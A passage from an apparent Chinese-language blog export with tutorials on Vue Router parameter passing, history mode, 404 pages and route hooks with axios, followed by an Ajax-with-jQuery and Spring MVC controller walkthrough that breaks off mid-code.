<h3 id="参数传递"><a href="#参数传递" class="headerlink" title="参数传递"></a>参数传递</h3><p>这里演示如果请求带有参数该怎么传递<br>demo<br> 用的还是上述例子的代码 修改一些代码 这里不放重复的代码了<br>第一种取值方式<br>1、 修改路由配置, 主要是router下的index.js中的 path 属性中增加了 :id 这样的占位符</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	path: <span class="string">'/user/profile/:id'</span>, </span><br><span class="line">	name:<span class="string">'UserProfile'</span>, </span><br><span class="line">	component: UserProfile</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>2、传递参数<br> 此时我们在Main.vue中的route-link位置处 to 改为了 :to，是为了将这一属性当成对象使用，注意 router-link 中的 name 属性名称 一定要和 路由中的 name 属性名称 匹配，因为这样 Vue 才能找到对应的路由路径；</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--name是组件的名字 params是传的参数 如果要传参数的话就需要用v:bind:来绑定--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">router-link</span> <span class="attr">:to</span>=<span class="string">"&#123;name:'UserProfile',params:&#123;id:1&#125;&#125;"</span>&gt;</span>个人信息<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line">12</span><br></pre></td></tr></table></figure>
<p>3、在要展示的组件Profile.vue中接收参数 使用 来接收<br>Profile.vue 部分代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;!--  所有的元素必须在根节点下--&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;h1&gt;个人信息&lt;&#x2F;h1&gt;</span><br><span class="line">    &#123;&#123;$route.params.id&#125;&#125;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br></pre></td></tr></table></figure>
<p>第二种取值方式 使用props 减少耦合<br>1、修改路由配置 , 主要在router下的index.js中的路由属性中增加了 props: true 属性</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	path: <span class="string">'/user/profile/:id'</span>, </span><br><span class="line">	name:<span class="string">'UserProfile'</span>, </span><br><span class="line">	component: UserProfile, </span><br><span class="line">	props: <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>2、传递参数和之前一样 在Main.vue中修改route-link地址</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--name是组件的名字 params是传的参数 如果要传参数的话就需要用v:bind:来绑定--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">router-link</span> <span class="attr">:to</span>=<span class="string">"&#123;name:'UserProfile',params:&#123;id:1&#125;&#125;"</span>&gt;</span>个人信息<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>3、在Profile.vue接收参数为目标组件增加 props 属性<br>Profile.vue</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    个人信息</span><br><span class="line">    &#123;&#123; id &#125;&#125;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    export default &#123;</span><br><span class="line">      props: [&#39;id&#39;],</span><br><span class="line">      name: &quot;UserProfile&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure>
<h3 id="路由模式与-404"><a href="#路由模式与-404" class="headerlink" title="路由模式与 404"></a>路由模式与 404</h3><p>路由模式有两种</p>
<ul>
<li>hash：路径带 # 符号，如 <a href="http://localhost/#/login" target="_blank" rel="noopener">http://localhost/#/login</a></li>
<li>history：路径不带 # 符号，如 <a href="http://localhost/login" target="_blank" rel="noopener">http://localhost/login</a></li>
</ul>
<p>修改路由配置，代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> Router(&#123;</span><br><span class="line">  mode: <span class="string">'history'</span>,</span><br><span class="line">  routes: [</span><br><span class="line">  ]</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>404 demo<br>1.创建一个NotFound.vue视图组件<br>NotFound.vue</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;h1&gt;404,你的页面走丢了&lt;&#x2F;h1&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    export default &#123;</span><br><span class="line">        name: &quot;NotFound&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure>
<p>2.修改路由配置index.js</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> NotFound <span class="keyword">from</span> <span class="string">'../views/NotFound'</span></span><br><span class="line">&#123;</span><br><span class="line">   path: <span class="string">'*'</span>,</span><br><span class="line">   component: NotFound</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>路由钩子与异步请求</strong></p>
<p>beforeRouteEnter：在进入路由前执行<br>beforeRouteLeave：在离开路由前执行</p>
<p>在Profile.vue中写</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  name: <span class="string">"UserProfile"</span>,</span><br><span class="line">  beforeRouteEnter: <span class="function">(<span class="params">to, <span class="keyword">from</span>, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"准备进入个人信息页"</span>);</span><br><span class="line">    next();</span><br><span class="line">  &#125;,</span><br><span class="line">  beforeRouteLeave: <span class="function">(<span class="params">to, <span class="keyword">from</span>, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"准备离开个人信息页"</span>);</span><br><span class="line">    next();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>参数说明：<br>to：路由将要跳转的路径信息<br>from：路径跳转前的路径信息<br>next：路由的控制参数<br>next() 跳入下一个页面<br>next(’/path’) 改变路由的跳转方向，使其跳到另一个路由<br>next(false) 返回原来的页面<br>next((vm)=&gt;{}) 仅在 beforeRouteEnter 中可用，vm 是组件实例</p>
<p><strong>在钩子函数中使用异步请求</strong></p>
<p>1、安装 Axios</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">cnpm install --save vue-axios</span><br></pre></td></tr></table></figure>
<p>2、main.js引用 Axios</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">'axios'</span></span><br><span class="line"><span class="keyword">import</span> VueAxios <span class="keyword">from</span> <span class="string">'vue-axios'</span></span><br><span class="line">Vue.use(VueAxios, axios)</span><br></pre></td></tr></table></figure>
<p>3、准备数据 ： 只有我们的 static 目录下的文件是可以被访问到的，所以我们就把静态文件放入该目录下。<br>数据和之前用的json数据一样 需要的去上述axios例子里</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 静态数据存放的位置</span></span><br><span class="line"><span class="keyword">static</span>/mock/data.json</span><br></pre></td></tr></table></figure>
<p>4.在 beforeRouteEnter 中进行异步请求<br>Profile.vue</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="comment">//第二种取值方式</span></span><br><span class="line">  <span class="comment">// props:['id'],</span></span><br><span class="line">  name: <span class="string">"UserProfile"</span>,</span><br><span class="line">  <span class="comment">//钩子函数 过滤器</span></span><br><span class="line">  beforeRouteEnter: <span class="function">(<span class="params">to, <span class="keyword">from</span>, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">//加载数据</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"进入路由之前"</span>)</span><br><span class="line">    next(<span class="function"><span class="params">vm</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">//进入路由之前执行getData方法</span></span><br><span class="line">      vm.getData()</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;,</span><br><span class="line">  beforeRouteLeave: <span class="function">(<span class="params">to, <span class="keyword">from</span>, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"离开路由之前"</span>)</span><br><span class="line">    next();</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">//axios</span></span><br><span class="line">  methods: &#123;</span><br><span class="line">    getData: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.axios(&#123;</span><br><span class="line">        method: <span class="string">'get'</span>,</span><br><span class="line">        url: <span class="string">'http://localhost:8080/static/mock/data.json'</span></span><br><span class="line">      &#125;).then(<span class="function"><span class="keyword">function</span> (<span class="params">response</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(response)</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><a href="/download/Vue.zip">源码下载</a></p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>前端开发</category>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>Ajax快速入门-2021/3/9</title>
    <url>/2021/03/09/Ajax%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8-2021-3-9/</url>
    <content><![CDATA[<h1 id="Ajax"><a href="#Ajax" class="headerlink" title="Ajax"></a>Ajax</h1><p>Ajax是一种无需重新加载整个网页的情况下，能够更新部分网页的技术</p>
<p>增加B/S的体验性<br>B/S：未来的主流，并且会爆发式的持续增长；</p>
<p>产品链：H5+网页+客户端+手机端(Android，IOS)+小程序</p>
<h2 id="伪Ajax"><a href="#伪Ajax" class="headerlink" title="伪Ajax"></a>伪Ajax</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>伪造Ajax<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"application/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> myDate = <span class="keyword">new</span> <span class="built_in">Date</span>();</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.getElementById(<span class="string">"currentTime"</span>).innerText = myDate.getTime();</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">loadPage</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> targetURL = <span class="built_in">document</span>.getElementById(<span class="string">"url"</span>).value;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(targetURL);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.getElementById(<span class="string">"iframePosition"</span>).src = targetURL;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>请输入要加载的地址：<span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"currentTime"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"url"</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"提交"</span> <span class="attr">onclick</span>=<span class="string">"loadPage()"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span></span><br><span class="line">        加载页面的位置:</span><br><span class="line">    <span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">style</span>=<span class="string">"width:1000px;height: 500px"</span> <span class="attr">id</span>=<span class="string">"iframePosition"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>通过这样一个html  可以实现一个伪Ajax</p>
<p>网页没有刷新 只需要提交不同的url 就可以显示页面</p>
<p><del>虚假的Ajax</del></p>
<h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><p>ajax需要导入jQuery</p>
<p>ajax基本参数：</p>
<ul>
<li><p>url   待载入页面的URL地址</p>
</li>
<li><p>data   待发送key/value参数</p>
</li>
<li><p>success   载入成功时回调函数</p>
</li>
<li><p>dataType   返回内容格式 xml,json,scrpt,text,html</p>
</li>
</ul>
<p>首先需要写一个AjaxController<br><figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">package com.ceit.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ceit.pojo.User;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line">@<span class="type">Controller</span></span><br><span class="line">@<span class="type">RequestMapping</span>(<span class="string">"/ajax"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AjaxController</span> </span>&#123;</span><br><span class="line">    <span class="comment">//第一种方式，服务器返回一个字符串，直接使用response</span></span><br><span class="line">    @<span class="type">RequestMapping</span>(<span class="string">"/a1"</span>)</span><br><span class="line">    <span class="keyword">public</span> void ajax(<span class="type">String</span> name, <span class="type">HttpServletResponse</span> httpServletResponse) <span class="keyword">throws</span> <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">"admin"</span>.equals(name))&#123;</span><br><span class="line">            httpServletResponse.getWriter().<span class="built_in">println</span>(<span class="string">"ture"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            httpServletResponse.getWriter().<span class="built_in">println</span>(<span class="string">"false"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>再编写对应的前端界面ajax.jsp<br><figure class="highlight erb"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-</span></span><br><span class="line"><span class="ruby">  Created by IntelliJ IDEA.</span></span><br><span class="line"><span class="ruby">  <span class="symbol">User:</span> songf</span></span><br><span class="line"><span class="ruby">  <span class="symbol">Date:</span> <span class="number">2021</span>/<span class="number">3</span>/<span class="number">9</span></span></span><br><span class="line"><span class="ruby">  <span class="symbol">Time:</span> <span class="number">22</span><span class="symbol">:</span><span class="number">32</span></span></span><br><span class="line"><span class="ruby">  To change this template use File <span class="params">| Settings |</span> File Templates.</span></span><br><span class="line"><span class="ruby">-</span><span class="xml">-%&gt;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="ruby">@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> </span><span class="xml"><span class="tag">%&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Ajax<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-    需要导入jQuery-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"$&#123;pageContext.request.contextPath&#125;/static/js/jquery-3.6.0.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"application/javascript"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    function a1()&#123;</span></span><br><span class="line"><span class="xml">        //ajax默认是GET请求</span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-$.ajax(&#123;-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-    <span class="symbol">url:</span><span class="string">"$&#123;pageContext.request.contextPath&#125;/ajax/a1"</span>,-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-    <span class="symbol">data:</span>&#123;<span class="string">"name"</span><span class="symbol">:</span>$(<span class="string">"#txtName"</span>).val()&#125;,-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-    <span class="symbol">success:</span>function (data,status) &#123;-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-        alert(data);-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-        alert(status);-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-    &#125;-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-&#125;);-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">        // ajax post请求</span></span><br><span class="line"><span class="xml">        $.post(&#123;</span></span><br><span class="line"><span class="xml">            url:"$&#123;pageContext.request.contextPath&#125;/ajax/a1",</span></span><br><span class="line"><span class="xml">            data:&#123;"name":$("#txtName").val()&#125;,</span></span><br><span class="line"><span class="xml">            success:function (data,status) &#123;</span></span><br><span class="line"><span class="xml">                alert(data);</span></span><br><span class="line"><span class="xml">                alert(status);</span></span><br><span class="line"><span class="xml">            &#125;</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //将文本框输入的值</span></span><br><span class="line"><span class="xml">        //发给服务器</span></span><br><span class="line"><span class="xml">        //接收服务器返回的数据</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-失去焦点产生事件-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">用户名:</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"txtName"</span> <span class="attr">onblur</span>=<span class="string">"a1()"</span> /&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight nsis"><table><tr><td class="code"><pre><span class="line">鼠标移上去 失去焦点后  产生事件 弹出<span class="literal">false</span> 紧跟着弹出success</span><br><span class="line"></span><br><span class="line">输入<span class="literal">admin</span> 鼠标失去焦点后  产生事件  弹出ture 紧跟着弹出success</span><br></pre></td></tr></table></figure></p>
<p>还可以实现一个表格的ajax更新<br>修改Controller<br><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">package com.ceit.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ceit.pojo.<span class="keyword">User</span>;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line">@Controller</span><br><span class="line">@RequestMapping("/ajax")</span><br><span class="line"><span class="built_in">public</span> <span class="keyword">class</span> AjaxController &#123;</span><br><span class="line">    //第一种方式，服务器返回一个字符串，直接使用response</span><br><span class="line">    @RequestMapping("/a1")</span><br><span class="line">    <span class="built_in">public</span> <span class="type">void</span> ajax(String <span class="type">name</span>, HttpServletResponse httpServletResponse) throws IOException &#123;</span><br><span class="line">        <span class="keyword">if</span>("admin".equals(<span class="type">name</span>))&#123;</span><br><span class="line">            httpServletResponse.getWriter().println("ture");</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            httpServletResponse.getWriter().println("false");</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @RequestMapping("/a2")</span><br><span class="line">    @ResponseBody</span><br><span class="line">    <span class="built_in">public</span> List&lt;<span class="keyword">User</span>&gt; ajax2()&#123;</span><br><span class="line">        ArrayList&lt;<span class="keyword">User</span>&gt; list = <span class="built_in">new</span> ArrayList&lt;<span class="keyword">User</span>&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">User</span> user1 = <span class="built_in">new</span> <span class="keyword">User</span>("弔弔1",<span class="number">3</span>,"男");</span><br><span class="line">        <span class="keyword">User</span> user2 = <span class="built_in">new</span> <span class="keyword">User</span>("弔弔2",<span class="number">3</span>,"男");</span><br><span class="line">        <span class="keyword">User</span> user3 = <span class="built_in">new</span> <span class="keyword">User</span>("弔弔3",<span class="number">3</span>,"男");</span><br><span class="line">        <span class="keyword">User</span> user4 = <span class="built_in">new</span> <span class="keyword">User</span>("弔弔4",<span class="number">3</span>,"男");</span><br><span class="line">        <span class="keyword">User</span> user5 = <span class="built_in">new</span> <span class="keyword">User</span>("弔弔5",<span class="number">3</span>,"男");</span><br><span class="line"></span><br><span class="line">        list.<span class="keyword">add</span>(user1);</span><br><span class="line">        list.<span class="keyword">add</span>(user2);</span><br><span class="line">        list.<span class="keyword">add</span>(user3);</span><br><span class="line">        list.<span class="keyword">add</span>(user4);</span><br><span class="line">        list.<span class="keyword">add</span>(user5);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> list; //由于加了@ResponseBody 他会返回一个字符串</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>对应的ajax2.jsp<br><figure class="highlight erb"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-</span></span><br><span class="line"><span class="ruby">  Created by IntelliJ IDEA.</span></span><br><span class="line"><span class="ruby">  <span class="symbol">User:</span> songf</span></span><br><span class="line"><span class="ruby">  <span class="symbol">Date:</span> <span class="number">2021</span>/<span class="number">3</span>/<span class="number">9</span></span></span><br><span class="line"><span class="ruby">  <span class="symbol">Time:</span> <span class="number">23</span><span class="symbol">:</span><span class="number">05</span></span></span><br><span class="line"><span class="ruby">  To change this template use File <span class="params">| Settings |</span> File Templates.</span></span><br><span class="line"><span class="ruby">-</span><span class="xml">-%&gt;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="ruby">@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> </span><span class="xml"><span class="tag">%&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">id</span>=<span class="string">"btn"</span> <span class="attr">value</span>=<span class="string">"获取数据"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">table</span> <span class="attr">width</span>=<span class="string">"80%"</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>姓名<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>年龄<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>性别<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">tbody</span> <span class="attr">id</span>=<span class="string">"content"</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"$&#123;pageContext.request.contextPath&#125;/static/js/jquery-3.6.0.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml">        $(function ()&#123;</span></span><br><span class="line"><span class="xml">           $("#btn").click(function () &#123;</span></span><br><span class="line"><span class="xml">               $.post("$&#123;pageContext.request.contextPath&#125;/ajax/a2",function (data) &#123;</span></span><br><span class="line"><span class="xml">                   console.log(data);</span></span><br><span class="line"><span class="xml">                   var html = ""</span></span><br><span class="line"><span class="xml">                   for(var i=0;i<span 